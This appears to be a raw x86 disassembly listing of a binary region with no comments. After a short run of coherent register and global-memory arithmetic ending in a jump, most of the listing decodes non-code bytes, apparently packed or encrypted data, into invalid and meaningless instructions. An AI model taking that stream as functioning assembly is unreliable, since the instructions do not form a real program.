  40cd49:	mov    DWORD PTR [ebp-0x8],eax
  40cd4c:	add    DWORD PTR ds:0x42a018,edi
  40cd52:	mov    eax,DWORD PTR [ebp-0xc]
  40cd55:	xor    eax,esi
  40cd57:	add    DWORD PTR ds:0x42c008,ebx
  40cd5d:	add    eax,edi
  40cd5f:	mov    DWORD PTR [ebp-0x24],eax
  40cd62:	mov    eax,ds:0x42a018
  40cd67:	add    DWORD PTR ds:0x42c000,eax
  40cd6d:	mov    eax,DWORD PTR [ebp-0x4]
  40cd70:	xor    DWORD PTR ds:0x429020,edi
  40cd76:	xor    eax,esi
  40cd78:	add    eax,edi
  40cd7a:	or     DWORD PTR ds:0x42b010,edx
  40cd80:	mov    DWORD PTR [ebp-0x30],eax
  40cd83:	mov    ebx,DWORD PTR [ebp-0x4]
  40cd86:	add    DWORD PTR ds:0x429018,0xc83
  40cd90:	jmp    0x40f126
  40cd95:	inc    edx
  40cd96:	mov    cl,dl
  40cd98:	rol    DWORD PTR [edx+0x31793981],0x8f
  40cd9f:	sti    
  40cda0:	jne    0x40cda0
  40cda2:	adc    ecx,DWORD PTR [edx]
  40cda4:	fiadd  DWORD PTR [edi-0x36]
  40cda7:	jp     0x40ce23
  40cda9:	add    eax,0xb27a7a5f
  40cdae:	fs mov ah,0x53
  40cdb1:	xlat   BYTE PTR ds:[ebx]
  40cdb2:	push   edx
  40cdb3:	xor    eax,0xa94bbb1f
  40cdb8:	mov    ecx,0x73024b93
  40cdbd:	bound  esp,QWORD PTR [edx+0x426d5437]
  40cdc3:	inc    eax
  40cdc4:	imul   ecx,DWORD PTR [ebx],0xd58c75c2
  40cdca:	test   BYTE PTR [eax-0x1c997a29],dh
  40cdd0:	icebp  
  40cdd1:	fistp  QWORD PTR [eax-0x6e]
  40cdd4:	xchg   ecx,eax
  40cdd5:	jb     0x40cd77
  40cdd7:	jno    0x40ce2f
  40cdd9:	cli    
  40cdda:	mov    ebp,ds
  40cddc:	inc    eax
  40cddd:	jle    0x40cdce
  40cddf:	repz sub al,0x81
  40cde2:	fsubr  DWORD PTR [bx+si+0x53]
  40cde6:	outs   dx,DWORD PTR ds:[esi]
  40cde7:	push   eax
  40cde8:	(bad)  
  40cde9:	bound  ebp,QWORD PTR [eax-0x7a]
  40cdec:	sbb    BYTE PTR [ebx+0x4482a55f],0x61
  40cdf3:	imul   BYTE PTR [edi+0x33aac88d]
  40cdf9:	retf   0x6ba5
  40cdfc:	pop    ss
  40cdfd:	or     esp,DWORD PTR [ecx+0x194ba75b]
  40ce03:	mov    bh,0x79
  40ce05:	es cwde 
  40ce07:	ret    
  40ce08:	cmp    ch,BYTE PTR [eax-0x2164e22e]
  40ce0e:	shl    DWORD PTR [ecx],1
  40ce10:	sbb    BYTE PTR [esp+edx*1+0x1a07a996],0x0
  40ce18:	popf   
  40ce19:	push   ecx
  40ce1a:	lods   al,BYTE PTR ds:[esi]
  40ce1b:	lea    ecx,[eax]
  40ce1d:	and    edx,edx
  40ce1f:	mov    edi,0xd579ee83
  40ce24:	cmp    BYTE PTR [ebx+edi*1],bh
  40ce27:	std    
  40ce28:	fnsave [ebp-0x55]
  40ce2b:	or     al,0x3a
  40ce2d:	inc    ebx
  40ce2e:	cli    
  40ce2f:	outs   dx,DWORD PTR ds:[esi]
  40ce30:	neg    DWORD PTR [edi-0x44]
  40ce33:	mov    ebx,DWORD PTR [esi+edx*8]
  40ce36:	sti    
  40ce37:	sub    eax,0x7a5c29e3
  40ce3c:	aam    0xf2
  40ce3e:	inc    esi
  40ce3f:	xchg   ebx,eax
  40ce40:	sbb    BYTE PTR [ebx],ch
  40ce42:	mov    ebx,0x81b6c66f
  40ce47:	aaa    
  40ce48:	dec    ecx
  40ce49:	or     DWORD PTR [edi-0x16c62df5],0x49797f77
  40ce53:	push   es
  40ce54:	ja     0x40ce2c
  40ce56:	lock and edx,edx
  40ce59:	xor    eax,0x5434854b
  40ce5e:	push   esi
  40ce5f:	and    BYTE PTR [edx-0x34],ah
  40ce62:	in     al,0x1
  40ce64:	inc    edx
  40ce65:	fs jbe 0x40cecc
  40ce68:	call   DWORD PTR [edx]
  40ce6a:	ins    BYTE PTR es:[edi],dx
  40ce6b:	pushf  
  40ce6c:	loope  0x40cdf1
  40ce6e:	adc    al,BYTE PTR [ebp+0x832a68e]
  40ce74:	xchg   BYTE PTR [edi+0x3b],cl
  40ce77:	dec    ebp
  40ce78:	je     0x40ce97
  40ce7a:	dec    edi
  40ce7b:	scas   al,BYTE PTR es:[edi]
  40ce7c:	dec    ecx
  40ce7d:	mov    dh,0x2c
  40ce7f:	ret    
  40ce80:	(bad)  
  40ce81:	add    ch,dh
  40ce83:	pop    ecx
  40ce84:	ja     0x40ceea
  40ce86:	sbb    eax,0x18ec659b
  40ce8b:	jecxz  0x40ce3e
  40ce8d:	mov    edi,0x24f35c5f
  40ce92:	push   ds
  40ce93:	jb     0x40ceac
  40ce95:	out    0x37,al
  40ce97:	inc    ebx
  40ce98:	(bad)  
  40ce99:	xor    eax,edi
  40ce9b:	dec    eax
  40ce9c:	sub    eax,0xda3d9e8f
  40cea1:	push   ebx
  40cea2:	pop    esi
  40cea3:	xchg   esi,eax
  40cea4:	push   0xffffffef
  40cea6:	sbb    edx,DWORD PTR [esi-0x32525ab0]
  40ceac:	mov    al,ds:0x4a0e419
  40ceb1:	fcom   QWORD PTR [esi]
  40ceb3:	jmp    0xb78c8560
  40ceb8:	aas    
  40ceb9:	sar    DWORD PTR [ecx-0x2878980e],cl
  40cebf:	test   al,0x5a
  40cec1:	or     al,0xd1
  40cec3:	jb     0x40ce4a
  40cec5:	mov    es,WORD PTR [ebx+eax*8-0x59]
  40cec9:	dec    edi
  40ceca:	cmc    
  40cecb:	mov    ss,WORD PTR [ebx]
  40cecd:	cld    
  40cece:	xor    BYTE PTR [edx+0x4bc4653d],bh
  40ced4:	int3   
  40ced5:	cmp    bl,BYTE PTR [ecx+0x5f]
  40ced8:	fst    DWORD PTR [esi-0x32597b9d]
  40cede:	imul   ecx,edi,0xa826e782
  40cee4:	mov    eax,DWORD PTR [ecx+0x6]
  40cee7:	push   edi
  40cee8:	repz in al,0x97
  40ceeb:	adc    DWORD PTR [eax],ebp
  40ceed:	push   edx
  40ceee:	retf   
  40ceef:	mov    ebp,0x6b58fd20
  40cef4:	es jb  0x40cf0e
  40cef7:	js     0x40cf20
  40cef9:	xor    eax,0x8bdbe4a5
  40cefe:	ffree  st(4)
  40cf00:	pop    ds
  40cf01:	sbb    edi,DWORD PTR [eax-0x79700d4d]
  40cf07:	cmp    BYTE PTR [ebx+0x5cc19779],ch
  40cf0d:	jo     0x40cf54
  40cf0f:	add    eax,0xfbf29f5a
  40cf14:	mov    ebx,0xc3d5a574
  40cf19:	adc    edi,edx
  40cf1b:	add    al,BYTE PTR [ebp-0x5f]
  40cf1e:	jge    0x40cf2d
  40cf20:	lods   eax,DWORD PTR ds:[esi]
  40cf21:	lods   eax,DWORD PTR ds:[esi]
  40cf22:	cs call 0xe1999419
  40cf28:	add    eax,edx
  40cf2a:	retf   0x4259
  40cf2d:	mul    DWORD PTR [ebp+0x71]
  40cf30:	pop    ebp
  40cf31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf32:	lea    ebx,[edi]
  40cf34:	(bad)  
  40cf35:	in     eax,0x5e
  40cf37:	lahf   
  40cf38:	(bad)  
  40cf39:	fist   DWORD PTR [edx+0x647ed3de]
  40cf3f:	cmp    esp,edi
  40cf41:	outs   dx,BYTE PTR ds:[esi]
  40cf42:	push   ss
  40cf43:	add    bl,BYTE PTR [edx+0x31]
  40cf46:	fs dec eax
  40cf48:	adc    bl,BYTE PTR [ebx+eiz*2+0x70]
  40cf4c:	(bad)  
  40cf4d:	pop    ebx
  40cf4e:	push   0x2f4069e4
  40cf53:	scas   eax,DWORD PTR es:[edi]
  40cf54:	adc    BYTE PTR [eax],cl
  40cf56:	in     eax,0xbe
  40cf58:	or     al,0xc4
  40cf5a:	xchg   ecx,ebp
  40cf5c:	or     DWORD PTR [edx-0x7625dde5],0x52
  40cf63:	sbb    BYTE PTR [eax+0x1c],bl
  40cf66:	je     0x40ceea
  40cf68:	es into 
  40cf6a:	mov    ds:0xd07c494e,eax
  40cf6f:	sub    ecx,ebp
  40cf71:	sbb    ebx,esp
  40cf73:	pushf  
  40cf74:	inc    edx
  40cf75:	mov    esi,0x764e42a4
  40cf7a:	jnp    0x40cfa4
  40cf7c:	fsub   DWORD PTR ds:0x438ea0a9
  40cf82:	out    dx,al
  40cf83:	inc    eax
  40cf84:	nop
  40cf85:	into   
  40cf86:	bswap  ecx
  40cf88:	das    
  40cf89:	add    edi,DWORD PTR [esi+0x67]
  40cf8c:	in     eax,0x63
  40cf8e:	mov    esp,0x8f709c77
  40cf93:	xchg   ebx,eax
  40cf94:	lock jl 0x40cf35
  40cf97:	lods   eax,DWORD PTR ds:[esi]
  40cf98:	hlt    
  40cf99:	test   edx,ecx
  40cf9b:	gs repnz pop edi
  40cf9e:	daa    
  40cf9f:	ror    DWORD PTR [edi],cl
  40cfa1:	inc    ecx
  40cfa2:	sub    BYTE PTR [eax+0x2],al
  40cfa5:	(bad)  
  40cfa6:	xor    al,0x51
  40cfa8:	and    cl,dl
  40cfaa:	mov    dl,0xaa
  40cfac:	mov    esi,0xfdf92114
  40cfb1:	dec    esp
  40cfb2:	outs   dx,DWORD PTR ds:[esi]
  40cfb3:	inc    ebx
  40cfb4:	pushf  
  40cfb5:	out    0x80,eax
  40cfb7:	or     DWORD PTR ds:0xee76b0b,esi
  40cfbd:	xor    ebp,DWORD PTR [ebx-0x1d63e232]
  40cfc3:	aaa    
  40cfc4:	fst    DWORD PTR [eax]
  40cfc6:	je     0x40d024
  40cfc8:	jle    0x40cf7e
  40cfca:	push   edi
  40cfcb:	test   al,0x1f
  40cfcd:	jg     0x40cf88
  40cfcf:	push   edx
  40cfd0:	jae    0x40cf8b
  40cfd2:	push   0xffffffeb
  40cfd4:	sahf   
  40cfd5:	(bad)  
  40cfd6:	aad    0x76
  40cfd8:	aad    0x8c
  40cfda:	push   es
  40cfdb:	sub    DWORD PTR [ecx],ebp
  40cfdd:	sti    
  40cfde:	cmp    al,0x78
  40cfe0:	ins    BYTE PTR es:[edi],dx
  40cfe1:	bound  esp,QWORD PTR [edi+0xf]
  40cfe4:	in     eax,0x98
  40cfe6:	repz out dx,eax
  40cfe8:	imul   DWORD PTR [ebp+0x5443ed7]
  40cfee:	jmp    0x1a04028c
  40cff3:	shl    DWORD PTR [edx],cl
  40cff5:	xchg   esi,eax
  40cff6:	jl     0x40d070
  40cff8:	xor    ebx,esp
  40cffa:	pop    ss
  40cffb:	dec    edi
  40cffc:	sar    BYTE PTR [esi-0x68],1
  40cfff:	or     DWORD PTR [ebx+0x78],ebx
  40d002:	es add eax,0x33a39192
  40d008:	inc    esi
  40d009:	jmp    0xfbbb:0xdfbf7cf6
  40d010:	dec    edi
  40d011:	or     DWORD PTR [esi-0xa32891d],ebx
  40d017:	xchg   esp,eax
  40d018:	frstpm(287 only) 
  40d01a:	pop    edi
  40d01b:	fld    DWORD PTR [edi+0x4e]
  40d01e:	inc    esp
  40d01f:	cvtpi2ps xmm4,QWORD PTR [eax]
  40d022:	push   edx
  40d023:	adc    DWORD PTR [ebx+0x24],edx
  40d026:	xchg   ebp,eax
  40d027:	or     esp,DWORD PTR [esi+esi*2]
  40d02a:	adc    DWORD PTR [ebx],0x38a3eccb
  40d030:	xchg   esp,eax
  40d031:	test   DWORD PTR ss:[edx],edi
  40d034:	push   ebp
  40d035:	int    0x3d
  40d037:	or     ebx,DWORD PTR [ebx-0xc90de00]
  40d03d:	cmp    eax,0x20323a7f
  40d042:	rol    al,1
  40d044:	cmp    eax,0x183bc3b8
  40d049:	xor    BYTE PTR [eax-0x4f],0x2b
  40d04d:	push   es
  40d04e:	enter  0x4485,0x5f
  40d052:	mov    edi,0xf41d2770
  40d057:	xor    edi,DWORD PTR [edi-0x62]
  40d05a:	sar    ch,cl
  40d05c:	sbb    BYTE PTR [esi-0x4fef8f00],dh
  40d062:	inc    esp
  40d063:	and    dl,BYTE PTR [edx+ebp*2-0x28a1617d]
  40d06a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d06b:	lods   eax,DWORD PTR ds:[esi]
  40d06c:	in     eax,dx
  40d06d:	lea    ecx,[edx-0x50fa4fd]
  40d073:	jb     0x40d0ac
  40d075:	xor    al,0xff
  40d077:	fs jne 0x40d004
  40d07a:	or     dl,BYTE PTR [ebp+0x4b]
  40d07d:	xor    eax,0x7fa3bd82
  40d082:	inc    eax
  40d083:	sbb    ebp,edi
  40d085:	add    DWORD PTR [ebp+0x14],edx
  40d088:	mov    al,ds:0xd32f56de
  40d08d:	mov    BYTE PTR [eax+0x7ab1b492],bl
  40d093:	(bad)  
  40d094:	and    al,0xdc
  40d096:	test   al,0x59
  40d098:	push   esp
  40d099:	into   
  40d09a:	push   ecx
  40d09b:	and    bh,BYTE PTR [ecx-0x69]
  40d09e:	adc    al,0x13
  40d0a0:	outs   dx,DWORD PTR ds:[esi]
  40d0a1:	pop    ebp
  40d0a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0a3:	xchg   esi,eax
  40d0a4:	repnz hlt 
  40d0a6:	add    al,0xd9
  40d0a8:	mov    ebp,0xfff5a1d1
  40d0ad:	mov    edx,0x38383d7a
  40d0b2:	into   
  40d0b3:	scas   al,BYTE PTR es:[edi]
  40d0b4:	xchg   ecx,eax
  40d0b5:	out    dx,al
  40d0b6:	mov    bh,0xed
  40d0b8:	inc    ebp
  40d0b9:	xchg   ch,cl
  40d0bb:	jmp    DWORD PTR [ebx-0x23cb8dc3]
  40d0c1:	call   0xbceb:0x71e22960
  40d0c8:	dec    ebp
  40d0c9:	sbb    DWORD PTR [esi-0x16],edx
  40d0cc:	xor    al,0x1e
  40d0ce:	add    eax,0x89fd14bb
  40d0d3:	or     BYTE PTR fs:[ecx+eax*1],ch
  40d0d7:	cmp    eax,0xb5907d5f
  40d0dc:	jmp    0x6cb9fc79
  40d0e1:	lods   al,BYTE PTR ds:[esi]
  40d0e2:	leave  
  40d0e3:	sub    BYTE PTR [esi+0x4b],dl
  40d0e6:	cmp    edx,DWORD PTR [edi-0x77]
  40d0e9:	sbb    eax,0x5602750
  40d0ee:	repz cmp eax,0xbc6b10a5
  40d0f4:	arpl   WORD PTR [eax],ax
  40d0f6:	in     al,0x32
  40d0f8:	sbb    DWORD PTR [edi],ebp
  40d0fa:	mov    eax,0x9646984d
  40d0ff:	mov    bl,0x5f
  40d101:	dec    edi
  40d102:	mov    al,0xba
  40d104:	push   ebx
  40d105:	inc    BYTE PTR [eax+eiz*1-0xdd19643]
  40d10c:	jno    0x40d178
  40d10e:	nop
  40d10f:	pop    ds
  40d110:	dec    ecx
  40d111:	cmp    ah,bh
  40d113:	push   esp
  40d114:	shl    DWORD PTR [edx-0x5a],0x20
  40d118:	fiadd  DWORD PTR [esi-0x76]
  40d11b:	hlt    
  40d11c:	dec    esi
  40d11d:	lds    esi,FWORD PTR [ebx-0x7b]
  40d120:	ficomp DWORD PTR [edx-0x25]
  40d123:	std    
  40d124:	icebp  
  40d125:	rol    DWORD PTR [edx],0xe7
  40d128:	add    eax,0x5297f68
  40d12d:	int3   
  40d12e:	test   al,0x88
  40d130:	mov    BYTE PTR [ecx-0x1b],al
  40d133:	or     eax,0x307a6411
  40d138:	mov    edi,0xfe35c938
  40d13d:	hlt    
  40d13e:	mov    esp,0xcb685c8b
  40d143:	mov    DWORD PTR [eax-0x6e],ebx
  40d146:	(bad)  
  40d147:	lea    ebp,[ebx]
  40d149:	mov    ?,ebx
  40d14b:	sbb    dl,BYTE PTR [edx+0x74]
  40d14e:	mov    ecx,0x550276f4
  40d153:	(bad)  
  40d154:	mov    ch,0x77
  40d156:	es cmp edx,edi
  40d159:	mov    fs,WORD PTR [ebp-0x547a0888]
  40d15f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d160:	or     bl,BYTE PTR [ebx+esi*2+0x52]
  40d164:	xor    al,0x79
  40d166:	sbb    DWORD PTR [ebx-0x5d],ebx
  40d169:	out    dx,eax
  40d16a:	cmp    DWORD PTR [eax-0x1cb7e997],0x7f
  40d171:	lods   al,BYTE PTR ds:[esi]
  40d172:	(bad)  [ebp+0x8]
  40d175:	mov    al,0x95
  40d177:	(bad)  
  40d178:	clc    
  40d179:	mov    bl,0x64
  40d17b:	es pop ds
  40d17d:	and    BYTE PTR [eax+0x35],ah
  40d180:	xor    al,0xaa
  40d182:	jae    0x40d152
  40d184:	inc    eax
  40d185:	ins    BYTE PTR es:[edi],dx
  40d186:	push   esp
  40d187:	sub    bl,BYTE PTR [esi+0x6e]
  40d18a:	scas   al,BYTE PTR es:[edi]
  40d18b:	and    DWORD PTR [ebp-0x4bc4ba63],ecx
  40d191:	mov    al,0x45
  40d193:	imul   eax,edi,0x72
  40d196:	iret   
  40d197:	cli    
  40d198:	jge    0x40d13b
  40d19a:	jbe    0x40d172
  40d19c:	int    0x44
  40d19e:	xchg   BYTE PTR [ebp+0x27596342],bh
  40d1a4:	jno    0x40d1be
  40d1a6:	dec    ecx
  40d1a7:	out    0x59,al
  40d1a9:	jge    0x40d1b2
  40d1ab:	pop    es
  40d1ac:	pop    esp
  40d1ad:	stos   DWORD PTR es:[edi],eax
  40d1ae:	xor    bl,BYTE PTR [edx]
  40d1b0:	jge    0x40d1e8
  40d1b2:	mov    bh,BYTE PTR [ebx+0x32]
  40d1b5:	or     edx,DWORD PTR [edi]
  40d1b7:	add    al,0xc3
  40d1b9:	fsubr  st(6),st
  40d1bb:	test   DWORD PTR [ebx+0x407d0975],0x2e7bda6
  40d1c5:	pop    es
  40d1c6:	and    BYTE PTR [edi+0x4c89ed65],dh
  40d1cc:	mov    DWORD PTR fs:[ebp-0x22b67149],esp
  40d1d3:	push   0x17
  40d1d5:	iret   
  40d1d6:	shl    BYTE PTR [edx],0xc6
  40d1d9:	bound  eax,QWORD PTR [eax-0x4]
  40d1dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1dd:	pop    es
  40d1de:	mov    edx,0x69020678
  40d1e3:	fdiv   DWORD PTR [ecx-0x67b371ed]
  40d1e9:	ja     0x40d266
  40d1eb:	push   esp
  40d1ec:	in     al,0x3a
  40d1ee:	cmc    
  40d1ef:	or     ch,BYTE PTR [ebx]
  40d1f1:	xchg   bl,bl
  40d1f3:	push   ebx
  40d1f4:	pop    esi
  40d1f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1f6:	dec    eax
  40d1f7:	cli    
  40d1f8:	lds    ebx,FWORD PTR [eax]
  40d1fa:	and    BYTE PTR [ecx-0x6173e9f8],0xbf
  40d201:	mov    dl,0x6b
  40d203:	loopne 0x40d23f
  40d205:	dec    esi
  40d206:	int3   
  40d207:	imul   edx,DWORD PTR ds:0xf9b8c9b5,0x17
  40d20e:	retf   
  40d20f:	repz adc al,0x85
  40d212:	aas    
  40d213:	or     BYTE PTR [ecx-0x2c1a4e5a],ch
  40d219:	and    DWORD PTR [ecx-0x5ad1cb3d],eax
  40d21f:	cmp    cl,dh
  40d221:	test   ebp,ebp
  40d223:	xchg   BYTE PTR [eax],dh
  40d225:	shl    DWORD PTR [ebx-0x7b8831c8],cl
  40d22b:	test   eax,0x91c53c78
  40d230:	(bad)  
  40d231:	jge    0x40d20c
  40d233:	add    al,0xa7
  40d235:	fimul  DWORD PTR [esi-0x4265a671]
  40d23b:	pop    edi
  40d23c:	lods   al,BYTE PTR ds:[esi]
  40d23d:	dec    edi
  40d23e:	push   0xb072b94f
  40d243:	jge    0x40d2b4
  40d245:	mov    DWORD PTR [esp+eax*1+0x312d8826],eax
  40d24c:	into   
  40d24d:	xor    DWORD PTR [ebp-0x5f7f2982],edi
  40d253:	sbb    eax,0x1024d816
  40d258:	inc    eax
  40d259:	jns    0x40d2a5
  40d25b:	mov    eax,ds:0x60c5c90e
  40d260:	jne    0x40d207
  40d262:	xchg   ebx,eax
  40d263:	repnz idiv ah
  40d266:	adc    al,0x79
  40d268:	mov    bl,0xce
  40d26a:	sbb    ecx,eax
  40d26c:	add    BYTE PTR [ebx+ebx*8],bl
  40d26f:	cmp    bh,BYTE PTR [edi+esi*4+0x4bac3220]
  40d276:	dec    esp
  40d277:	es push esp
  40d279:	dec    eax
  40d27a:	pop    edx
  40d27b:	fsubr  QWORD PTR [esi]
  40d27d:	adc    ch,BYTE PTR [edx]
  40d27f:	loopne 0x40d2e0
  40d281:	hlt    
  40d282:	push   0x44f2705e
  40d287:	imul   ebx,DWORD PTR [esi+0x5b8d1bfa],0x1cc9be41
  40d291:	test   al,0x7d
  40d293:	scas   eax,DWORD PTR es:[edi]
  40d294:	or     eax,0x19777d57
  40d299:	fs das 
  40d29b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d29c:	xor    esp,DWORD PTR [edx-0x4d]
  40d29f:	sub    BYTE PTR [edx-0xe6953be],al
  40d2a5:	push   DWORD PTR [edi+0x52ce17e6]
  40d2ab:	popa   
  40d2ac:	lea    esi,[ebx]
  40d2ae:	pop    ecx
  40d2af:	das    
  40d2b0:	add    eax,0x21e2a746
  40d2b5:	dec    ecx
  40d2b6:	and    DWORD PTR [esi],0x44
  40d2b9:	xchg   BYTE PTR [ecx],cl
  40d2bb:	adc    eax,0xfa372090
  40d2c0:	pop    edx
  40d2c1:	sub    al,cl
  40d2c3:	pop    ds
  40d2c4:	pop    es
  40d2c5:	(bad)  
  40d2c6:	fst    DWORD PTR [eax]
  40d2c8:	loopne 0x40d29c
  40d2ca:	pop    edi
  40d2cb:	fadd   QWORD PTR [edi+ebp*1-0x6a]
  40d2cf:	out    0x7d,eax
  40d2d1:	hlt    
  40d2d2:	jb     0x40d309
  40d2d4:	add    ch,BYTE PTR [edi]
  40d2d6:	add    bl,dl
  40d2d8:	jb     0x40d277
  40d2da:	adc    dl,BYTE PTR [esi+0x61]
  40d2dd:	cmp    eax,0x1dfbdea
  40d2e2:	pop    esp
  40d2e3:	mov    bl,0x47
  40d2e5:	push   0x2e
  40d2e7:	jno    0x40d359
  40d2e9:	shr    DWORD PTR [edi+0x756465aa],cl
  40d2ef:	loopne 0x40d2bd
  40d2f1:	mov    cl,0x59
  40d2f3:	test   eax,0xc7f5ef69
  40d2f8:	lds    ebp,FWORD PTR [ebx+0x5d]
  40d2fb:	mov    ebx,0x637de05
  40d300:	mov    BYTE PTR [ebx],bl
  40d302:	test   DWORD PTR [eax+ebp*2-0x7d7f1a4d],eax
  40d309:	xlat   BYTE PTR ds:[ebx]
  40d30a:	outs   dx,BYTE PTR ds:[esi]
  40d30b:	loop   0x40d2f0
  40d30d:	mov    dl,0xca
  40d30f:	imul   ebx,DWORD PTR [edx],0x53f80c0
  40d315:	sbb    BYTE PTR [ebx+0x388dabe2],al
  40d31b:	popf   
  40d31c:	mov    ds:0x18e68182,al
  40d321:	cmp    edx,DWORD PTR [esi+ebx*8]
  40d324:	sub    ah,BYTE PTR [edi+0x3082e85]
  40d32a:	xchg   edx,eax
  40d32b:	push   edi
  40d32c:	or     eax,0x56cc29e3
  40d331:	stc    
  40d332:	dec    esi
  40d333:	xchg   esp,eax
  40d334:	out    0xfd,eax
  40d336:	outs   dx,BYTE PTR ds:[esi]
  40d337:	sbb    BYTE PTR [edi+edx*1-0x78],ch
  40d33b:	call   0x3fc6ee16
  40d340:	retf   
  40d341:	sbb    BYTE PTR [eax+0x35],0x23
  40d345:	pop    ss
  40d346:	gs inc edi
  40d348:	sub    BYTE PTR [edx+ecx*1-0x46],dh
  40d34c:	or     BYTE PTR [edi],dh
  40d34e:	cmp    eax,DWORD PTR ds:0xe3d51c94
  40d354:	stc    
  40d355:	dec    edx
  40d356:	cld    
  40d357:	sub    dl,BYTE PTR ds:0x2c8614b7
  40d35d:	cs mov edi,0x2aa86f4
  40d363:	repnz bound dx,DWORD PTR [ecx+eax*1]
  40d368:	iret   
  40d369:	popf   
  40d36a:	pop    ebx
  40d36b:	add    al,0xd8
  40d36d:	bound  eax,QWORD PTR [ecx+0x3cfd8277]
  40d373:	and    cl,BYTE PTR [edx]
  40d375:	je     0x40d3bd
  40d377:	aaa    
  40d378:	push   esi
  40d379:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d37a:	dec    edi
  40d37b:	loop   0x40d3ae
  40d37d:	mov    bl,0xde
  40d37f:	popa   
  40d380:	mov    ?,WORD PTR ss:0xf4833634
  40d387:	adc    al,0xd6
  40d389:	cmp    eax,0xadd1e6c
  40d38e:	fimul  WORD PTR [edx-0x22]
  40d391:	or     eax,0xd6a8b687
  40d396:	jge    0x40d385
  40d398:	push   ss
  40d399:	fld    DWORD PTR [ecx-0x3f0608f5]
  40d39f:	sbb    BYTE PTR [eax-0x6f],al
  40d3a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3a3:	clc    
  40d3a4:	in     eax,0x1b
  40d3a6:	dec    ecx
  40d3a7:	mov    esi,0xa779b55c
  40d3ac:	(bad)  
  40d3ad:	repnz in al,0x65
  40d3b0:	shl    BYTE PTR [ebx-0x72],cl
  40d3b3:	fcomp  QWORD PTR fs:[ebx-0x6a927ed0]
  40d3ba:	ja     0x40d3a5
  40d3bc:	jecxz  0x40d369
  40d3be:	xchg   ebp,eax
  40d3bf:	jmp    0x5c68:0xec9973cb
  40d3c6:	cld    
  40d3c7:	sub    ah,BYTE PTR [eax-0xc7cdef]
  40d3cd:	pop    ecx
  40d3ce:	rcr    eax,1
  40d3d0:	nop
  40d3d1:	and    al,0x83
  40d3d3:	sbb    eax,0x97c295c5
  40d3d8:	aaa    
  40d3d9:	or     DWORD PTR [esi-0x4c],0x3f1a6f8
  40d3e0:	loopne 0x40d377
  40d3e2:	js     0x40d3ed
  40d3e4:	leave  
  40d3e5:	cmp    ch,BYTE PTR [eax+edi*8-0x73]
  40d3e9:	stos   DWORD PTR es:[edi],eax
  40d3ea:	cmp    BYTE PTR [ecx],ah
  40d3ec:	jl     0x40d3a4
  40d3ee:	or     al,0x1a
  40d3f0:	ffreep st(2)
  40d3f2:	cmp    ecx,ebp
  40d3f4:	(bad)  
  40d3f5:	mov    ch,0xf5
  40d3f7:	add    DWORD PTR [edi+edi*4+0x4c],edi
  40d3fb:	icebp  
  40d3fc:	scas   al,BYTE PTR es:[edi]
  40d3fd:	adc    eax,0x9e6aa583
  40d402:	outs   dx,DWORD PTR ds:[esi]
  40d403:	mov    dh,0x9e
  40d405:	test   BYTE PTR [edi-0x6b],ah
  40d408:	push   0x31a6db73
  40d40d:	into   
  40d40e:	mov    al,0x18
  40d410:	sub    eax,0xba3bdbe0
  40d415:	pop    eax
  40d416:	out    0xcb,al
  40d418:	adc    eax,0x5266d1cf
  40d41d:	cdq    
  40d41e:	lods   eax,DWORD PTR ds:[esi]
  40d41f:	jbe    0x40d400
  40d421:	fisub  DWORD PTR [edx]
  40d423:	shl    BYTE PTR ds:0xa806ea95,1
  40d429:	gs mov esi,0x658cf668
  40d42f:	out    dx,eax
  40d430:	movnti DWORD PTR [esp+ebx*1],ebp
  40d434:	popa   
  40d435:	fldenv [eax+edi*2+0x2]
  40d439:	cmp    eax,0xac430898
  40d43e:	rcr    edi,0x5a
  40d441:	ror    DWORD PTR [edx],1
  40d443:	mov    eax,0x573bea22
  40d448:	das    
  40d449:	xor    DWORD PTR [edi],eax
  40d44b:	sub    eax,0x9c71570d
  40d450:	test   esp,0x3ab55dc1
  40d456:	mov    esi,0xcc578a1a
  40d45b:	and    ecx,DWORD PTR [edx-0x58]
  40d45e:	push   edx
  40d45f:	xchg   esi,eax
  40d460:	push   ds
  40d461:	jle    0x40d44c
  40d463:	lds    ebx,FWORD PTR [ecx-0x2f]
  40d466:	loopne 0x40d463
  40d468:	xchg   edi,eax
  40d469:	loopne 0x40d4c9
  40d46b:	mov    ebx,0x133a4ced
  40d470:	and    eax,0x42eaa581
  40d475:	push   es
  40d476:	push   esp
  40d477:	outs   dx,BYTE PTR ds:[esi]
  40d478:	call   eax
  40d47a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d47b:	jno    0x40d44f
  40d47d:	jae    0x40d4d7
  40d47f:	mov    al,ds:0xf0811770
  40d484:	sub    BYTE PTR [ebx-0x48],cl
  40d487:	je     0x40d446
  40d489:	pop    ebp
  40d48a:	sub    DWORD PTR [ebx-0x11],ebp
  40d48d:	pusha  
  40d48e:	into   
  40d48f:	es jl  0x40d4a4
  40d492:	push   edi
  40d493:	sub    esi,eax
  40d495:	shl    DWORD PTR [eax-0x7fe9b43],0xb3
  40d49c:	mov    edi,0x345fada6
  40d4a1:	pusha  
  40d4a2:	pop    ebp
  40d4a3:	sub    edi,eax
  40d4a5:	jne    0x40d4dd
  40d4a7:	or     al,0xf7
  40d4a9:	xor    al,0x5f
  40d4ab:	aad    0x79
  40d4ad:	jo     0x40d436
  40d4af:	sbb    al,0xc0
  40d4b1:	rol    DWORD PTR [esi],cl
  40d4b3:	cdq    
  40d4b4:	rcl    ch,cl
  40d4b6:	xlat   BYTE PTR ds:[ebx]
  40d4b7:	jmp    0xc319:0x2d20f08e
  40d4be:	mov    esp,0xa6453454
  40d4c3:	mov    edx,0xa7405bef
  40d4c8:	loop   0x40d540
  40d4ca:	cmp    edx,DWORD PTR [eax]
  40d4cc:	sahf   
  40d4cd:	inc    eax
  40d4ce:	push   ss
  40d4cf:	repz mov edi,0x235e6d2e
  40d4d5:	xor    al,0x9f
  40d4d7:	adc    ebp,DWORD PTR [edx+0x18f22d8]
  40d4dd:	out    0x5d,al
